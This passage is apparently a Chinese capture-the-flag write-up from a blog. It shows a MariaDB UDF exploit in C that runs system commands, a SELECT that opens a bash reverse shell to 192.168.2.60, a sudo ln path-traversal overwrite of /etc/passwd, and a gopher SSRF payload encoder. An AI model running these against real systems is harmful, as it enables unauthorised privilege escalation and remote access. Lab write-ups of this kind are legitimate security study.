+        char                    *maybe_null;    // 1 for maybe_null args
+
+} UDF_ARGS;
+
+
+
+typedef struct st_udf_init {
+
+        char                    maybe_null;     // 1 if func can return NULL
+
+        unsigned int            decimals;       // for real functions
+
+        unsigned long           max_length;     // for string functions
+
+        char                    *ptr;           // free ptr for func data
+
+        char                    const_item;     // 0 if result is constant
+
+} UDF_INIT;
+
+
+
+int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
+
+{
+
+        if (args-&gt;arg_count != 1)
+
+                return(0);
+
+
+
+        system(args-&gt;args[0]);
+
+
+
+        return(0);
+
+}
+
+
+
+char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
+
+{
+
+        return(0);
+
+}
+
+-------------------------------------------------------------------------
+
+lemon@XIYI:/tmp$ gcc -g -shared -o udf.so udf.c -lc
+lemon@XIYI:/tmp$ sudo /usr/bin/ln -sf /tmp/udf.so /usr/lib/mysql/plugin/udf.so
+
+
+lemon@XIYI:/tmp$ mysql -uroot -prootted
+
+MariaDB [(none)]&gt; CREATE FUNCTION do_system RETURNS INTEGER SONAME 'udf.so';
+Query OK, 0 rows affected (0.002 sec)
+
+MariaDB [(none)]&gt; SELECT * FROM mysql.func WHERE name='do_system';
++-----------+-----+--------+----------+
+| name      | ret | dl     | type     |
++-----------+-----+--------+----------+
+| do_system |   2 | udf.so | function |
++-----------+-----+--------+----------+
+1 row in set (0.001 sec)
+
+MariaDB [(none)]&gt; SELECT do_system('/bin/bash -c "bash -i &gt;&amp; /dev/tcp/192.168.2.60/2332 0&gt;&amp;1"');
+strace: Process 1123 attached
+strace: Process 1124 attached
+strace: Process 1125 attached
+
+
+mysql@XIYI:/var/lib/mysql$ cat root.bak
+cat root.bak
+root:ezlemon
+</code></pre>
+<p>即可接收到mysql权限的shell，提权即可</p>
+<h2>非预期解</h2>
+<p>sudo权限提供了ln，路径穿越覆盖即可</p>
+<pre class="notranslate"><code class="notranslate">sudo /usr/bin/ln -sf /home/lemon/passwd /usr/lib/mysql/plugin/../../../../../etc/passwd
+</code></pre>
+<h2>root.txt</h2>
+<pre class="notranslate"><code class="notranslate">root@XIYI:~# cat /root/root.txt 
+flag{root-e6a6e8eac98579c8d826d07df3c132bc}
+</code></pre>
+<h1>附上脚本</h1>
+<p>听是好多被gopher编码恶心到了，附上一直在用的脚本</p>
+<h2>gopher编码脚本</h2>
+<pre class="notranslate"><code class="notranslate">#!/usr/bin/env python3
+"""
+gopher_single_encode.py
+
+按"单次 percent-encode"规则生成 gopher POST 请求的 selector 和 gopher:// URL。
+
+不会执行网络请求——仅生成编码字符串供你在本地测试使用。
+
+用法（交互式）:
+  python3 gopher_single_encode.py
+
+或命令行:
+  python3 gopher_single_encode.py --host 127.0.0.1 --port 5000 --path / --body 'name=foo'
+  python3 gopher_single_encode.py --host 127.0.0.1 --port 5000 --path / --file payload.txt
+  python3 gopher_single_encode.py --host 127.0.0.1 --port 5000 --path / --method GET --body 'cmd=ls'
+"""
+import argparse
+import urllib.parse
+import sys
+
+def build_raw_request(host, port, path, body, method="POST", extra_headers=None):
+    lines = []
+    
+    if method.upper() == "GET":
+        # 对于GET请求，将参数附加到路径中
+        if body:
+            if '?' in path:
+                path += '&amp;' + body
+            else:
+                path += '?' + body
+        lines.append(f"GET {path} HTTP/1.1")
+        lines.append(f"Host: {host}:{port}")
+        # GET请求通常没有Content-Type和Content-Length
+        if extra_headers:
+            for k,v in extra_headers.items():
+                lines.append(f"{k}: {v}")
+    else:
+        # 默认POST请求
+        content_length = len(body.encode('utf-8'))
+        lines.append(f"POST {path} HTTP/1.1")
+        lines.append(f"Host: {host}:{port}")
+        headers = {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Content-Length": str(content_length),
+        }
+        if extra_headers:
+            headers.update(extra_headers)
+        for k,v in headers.items():
+            lines.append(f"{k}: {v}")
+    
+    request = "\r\n".join(lines) + "\r\n\r\n"
+    
+    # 对于POST请求，添加请求体
+    if method.upper() == "POST" and body:
+        request += body
+        
+    return request
+
+def single_encode_selector(raw_request, prefix_underscore=True):
+    # Percent-encode the raw_request (encode all non-alphanum)
+    encoded = urllib.parse.quote(raw_request, safe='')
+    selector = ("_" if prefix_underscore else "") + encoded
+    return selector
+
+def make_gopher_url(host, port, selector):
+    return f"gopher://{host}:{port}/{selector}"
+
+def parse_args():
+    p = argparse.ArgumentParser()
+    p.add_argument("--host", "-H", default=None, help="target host (IP)")
+    p.add_argument("--port", "-P", default=None, help="target port")
+    p.add_argument("--path", default="/", help="HTTP path, e.g. / or /submit")
+    p.add_argument("--body", "-d", default=None, help="POST body or GET query string (raw text). If omitted, will prompt.")
+    p.add_argument("--file", "-f", default=None, help="Read payload from file")
+    p.add_argument("--method", "-m", default="POST", choices=["GET", "POST"], help="HTTP method (GET or POST)")
+    p.add_argument("--prefix-underscore", action="store_true", default=True, help="prefix selector with '_' (common usage)")
+    p.add_argument("--no-prefix-underscore", action="store_false", dest="prefix_underscore", help="do not prefix selector with '_'")
+    p.add_argument("--headers", default=None, help="Additional headers in format 'Header1: Value1;Header2: Value2'")
+    return p.parse_args()
+
+def main():
+    args = parse_args()
+    host = args.host or input("target host (IP, e.g. 127.0.0.1): ").strip()
+    port = args.port or input("target port (e.g. 5000): ").strip()
+    path = args.path
+    method = args.method
+    
+    # 处理额外headers
+    extra_headers = {}
+    if args.headers:
+        for header_pair in args.headers.split(';'):
+            if ':' in header_pair:
+                key, value = header_pair.split(':', 1)
+                extra_headers[key.strip()] = value.strip()
+    
+    # 从文件或命令行参数获取body
+    body = ""
+    if args.file:
+        try:
+            with open(args.file, 'r', encoding='utf-8') as f:
+                body = f.read().strip()
+        except FileNotFoundError:
+            print(f"Error: File {args.file} not found.")
+            sys.exit(1)
+        except Exception as e:
+            print(f"Error reading file: {e}")
+            sys.exit(1)
+    elif args.body:
+        body = args.body
+    else:
+        print(f"Enter {method} body/query (single line). End with Enter:")
+        body = sys.stdin.readline().rstrip("\n")
+
+    raw_request = build_raw_request(host, port, path, body, method=method, extra_headers=extra_headers)
+    selector = single_encode_selector(raw_request, prefix_underscore=args.prefix_underscore)
+    gopher_url = make_gopher_url(host, port, selector)
+
+    print(f"\n--- RAW HTTP {method} REQUEST (visualized CRLF as \\r\\n) ---\n")
+    print(raw_request.replace("\r\n", "\\r\\n\n"))
+    print("\n--- Single-encode selector ---\n")
+    print(selector)
+    print("\n--- gopher URL (paste into a client that supports gopher) ---\n")
+    print(gopher_url)
+    print("\n--- NOTES ---")
+    if method == "POST":
+        print("- Content-Length computed as bytes length of body (UTF-8).")
+    print("- This is SINGLE percent-encoding (client needs to decode once to get real CRLF).")
+    print("")
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+<h2>零宽解密脚本</h2>
+<pre class="notranslate"><code class="notranslate">非通用
+
+
+import os
+import sys
+
+# --- 零宽字符与二进制位的映射 ---
+# ZWSP: \u200b -&gt; 0
+# ZWNJ: \u200c -&gt; 1
+ZERO_WIDTH_CHARS = {
+    '\u200b': '0',  # ZERO WIDTH SPACE (ZWSP)
+    '\u200c': '1',  # ZERO WIDTH NON-JOINER (ZWNJ)
+}
+# V3版本中，我们忽略分隔符（如 \u200d），强制按 8 位解析。
+BYTE_SIZE = 8
+
+def binary_to_text(binary_data: str) -&gt; str:
+    """
+    将二进制字符串（8位）转换为对应的文本。
+    """
+    if not binary_data:
+        return ""
+    
+    try:
+        char_code = int(binary_data, 2)
+        return chr(char_code)
+    except ValueError:
+        return f"[错误: 无法解析二进制串 '{binary_data}']"
+    except OverflowError:
+        # 当尝试将非常长的字符串解析为单个数字时出现
+        return f"[错误: 数字过大或编码无效 '{binary_data}']"
+
+def decode_zero_width_steg(encoded_text: str) -&gt; str:
+    """
+    从包含零宽隐写的文本中解密隐藏消息，强制按 8 位一组解析。
+    """
+    
+    extracted_bits = ""
+    
+    # 1. 提取所有有效的零宽字符并转换成一个连续的二进制长串
+    for char in encoded_text:
+        if char in ZERO_WIDTH_CHARS:
+            extracted_bits += ZERO_WIDTH_CHARS[char]
+        # 注意：这里会忽略任何其他零宽字符，如 \u200d (ZWJ)
+            
+    if not extracted_bits:
+        return "--- ❗ 未发现有效的零宽隐写信息！(或使用的零宽字符映射不匹配) ---"
+        
+    decoded_message = []
+    
+    # 2. 强制将二进制长串分割成 8 位一组进行解码
+    # 遍历二进制串，步长为 8
+    for i in range(0, len(extracted_bits), BYTE_SIZE):
+        # 取出当前 8 位
+        byte = extracted_bits[i:i + BYTE_SIZE]
+        
+        if len(byte) == BYTE_SIZE:
+            # 只有完整的 8 位才进行解码
+            decoded_char = binary_to_text(byte)
+            decoded_message.append(decoded_char)
+        else:
+            # 如果剩余的位数不足 8 位，可能是消息结束或填充不完整
+            print(f"\n警告：二进制串长度非 8 的倍数，忽略剩余 {len(byte)} 位: {byte}")
+
+    return "".join(decoded_message)
+
+def decode_from_file(file_path: str):
+    """
+    从指定文件读取内容并进行零宽隐写解密。
+    """
+    if not os.path.exists(file_path):
+        print(f"❌ 错误：文件 '{file_path}' 不存在。")
+        return
+
+    print(f"--- 正在读取文件: {file_path} ---")
+    
+    try:
+        # 必须以UTF-8编码读取文件
+        with open(file_path, 'r', encoding='utf-8') as f:
+            content = f.read()
+            
+        secret_message = decode_zero_width_steg(content)
+        
+        print("\n*** ✅ 解密结果 ***")
+        print(secret_message)
+        print("********************")
+        
+    except UnicodeDecodeError:
+        print("❌ 错误：文件编码不是 UTF-8，请确保文件保存为 UTF-8 格式。")
+    except Exception as e:
+        print(f"❌ 发生错误: {e}")
+
+# --- 主程序入口 ---
+if __name__ == "__main__":
+    
+    if len(sys.argv) &lt; 2:
+        print("💡 用法: python3 decode.py &lt;文件路径&gt;")
+        sys.exit(1)
+    else:
+        file_to_decode = sys.argv[1]
+        decode_from_file(file_to_decode)
+</code></pre></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://faabbi.github.io">MJ</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","faabbi/faabbi.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
